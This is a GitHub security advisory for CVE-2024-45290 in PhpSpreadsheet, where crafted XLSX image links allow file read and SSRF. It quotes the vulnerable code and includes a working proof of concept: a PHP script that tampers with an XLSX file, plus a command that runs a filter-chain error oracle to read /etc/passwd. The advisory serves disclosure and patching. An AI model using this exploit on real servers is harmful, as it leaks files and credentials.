# [H] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery when opening XLSX file

## Summary
Severity: High
Advisory: GHSA-5gpr-w2p5-6m37
CVE: CVE-2024-45290
CWE: CWE-36, CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2024-10-07
Source: https://github.com/advisories/GHSA-5gpr-w2p5-6m37
Type: github-advisory

## Affected
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.2.0 <2.3.0
- Packagist: `phpoffice/phpspreadsheet` — affected >=0 <1.29.2
- Packagist: `phpoffice/phpspreadsheet` — affected >=2.0.0 <2.1.1
- Packagist: `phpoffice/phpexcel` — affected >=0

## Details
### Summary

It's possible for an attacker to construct an XLSX file which links media from external URLs. When opening the XLSX file, PhpSpreadsheet retrieves the image size and type by reading the file contents, if the provided path is a URL. By using specially crafted `php://filter` URLs an attacker can leak the contents of any file or URL.

Note that this vulnerability is different from [GHSA-w9xv-qf98-ccq4](https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4), and resides in a different component.

### Details

When an XLSX file is opened, the XLSX reader calls `setPath()` with the path provided in the `xl/drawings/_rels/drawing1.xml.rels` file in the XLSX archive:

```php
if (isset($images[$embedImageKey])) {
    // ...omit irrelevant code...
} else {
    $linkImageKey = (string) self::getArrayItem(
        $blip->attributes('http://schemas.openxmlformats.org/officeDocument/2006/relationships'),
        'link'
    );
    if (isset($images[$linkImageKey])) {
        $url = str_replace('xl/drawings/', '', $images[$linkImageKey]);
        $objDrawing->setPath($url);
    }
}
```

`setPath()` then reads the file in order to determine the file type and dimensions, if the path is a URL:

```php
public function setPath(string $path, bool $verifyFile = true, ?ZipArchive $zip = null): static
{
    if ($verifyFile && preg_match('~^data:image/[a-z]+;base64,~', $path) !== 1) {
        // Check if a URL has been passed. https://stackoverflow.com/a/2058596/1252979
        if (filter_var($path, FILTER_VALIDATE_URL)) {
            $this->path = $path;
            // Implicit that it is a URL, rather store info than running check above on value in other places.
            $this->isUrl = true;
            $imageContents = file_get_contents($path);
            // ... check dimensions etc. ...
```

It's important to note here, that `filter_var` considers also `file://` and `php://` URLs valid.

The attacker can set the path to anything:

```xml
<Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="this can be whatever" />
```

The contents of the file are not made available for the attacker directly. However, using PHP filter URLs it's possible to construct an [error oracle](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle) which leaks a file or URL contents one character at a time. The error oracle was originally invented by @hash_kitten, and the folks at Synacktiv have developed a nice tool for easily exploiting those: https://github.com/synacktiv/php_filter_chains_oracle_exploit

### PoC

Target file:

```php
<?php

require 'vendor/autoload.php';

// Attack part: this would actually be done by the attacker on their machine and the resulting XLSX uploaded, but to
// keep the PoC simple, I've combined this into the same file.

$file = "book_tampered.xlsx";
$payload = $_POST["payload"]; // the payload comes from the Python script

copy("book.xlsx",$file);
$zip = new ZipArchive;
$zip->open($file);

$path = "xl/drawings/_rels/drawing1.xml.rels";
$content = $zip->getFromName($path);
$content = str_replace("../media/image1.gif", $payload, $content);
$zip->addFromString($path, $content);

$path = "xl/drawings/drawing1.xml";
$content = $zip->getFromName($path);
$content = str_replace('r:embed="rId1"', 'r:link="rId1"', $content);
$zip->addFromString($path, $content);

$zip->close();

// The actual target - note that simply opening the file is sufficient for the attack

$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader("Xlsx");
$spreadsheet = $reader->load(__DIR__ . '/' . $file);

```

Add this file in the same directory:
[book.xlsx](https://github.com/PHPOffice/PhpSpreadsheet/files/15213296/book.xlsx)

Serve the PoC from a web server. Ensure your PHP memory limit is <= 128M - otherwise you'll need to edit the Python script below.

Download the error oracle Python script from here: https://github.com/synacktiv/php_filter_chains_oracle_exploit. If your memory limit is greater than 128M, you'll need to edit the Python script's `bruteforcer.py` file to change `self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)` to `self.blow_up_inf = self.join(*[self.blow_up_utf32]*20)`. This is needed so that it generates large-enough payloads to trigger the out of memory errors the oracle relies on. Also install the script's dependencies with `pip`.

Then run the Python script with:
```
python3 filters_chain_oracle_exploit.py --target [URL of the script] --parameter payload --file /etc/passwd
```

Note that the attack relies on certain character encodings being supported by the system's `iconv` library, because PHP uses that. As far as I know, most Linux distributions have them, but notably MacOS does not. So if you're developing on a Mac, you'll want to run your server in a virtual machine with Linux.

Here's the results I got after about a minute of bruteforcing:

![image](https://github.com/PHPOffice/PhpSpreadsheet/assets/1294941/06cbaf62-1001-481f-bbcd-d818a61896c4)

### Impact

An attacker can access any file on the server, or leak information form arbitrary URLs, potentially exposing sensitive information such as AWS IAM credentials.

## References
- https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37
- https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4
- https://nvd.nist.gov/vuln/detail/CVE-2024-45290
- https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a
- https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec
- https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465
- https://github.com/PHPOffice/PhpSpreadsheet
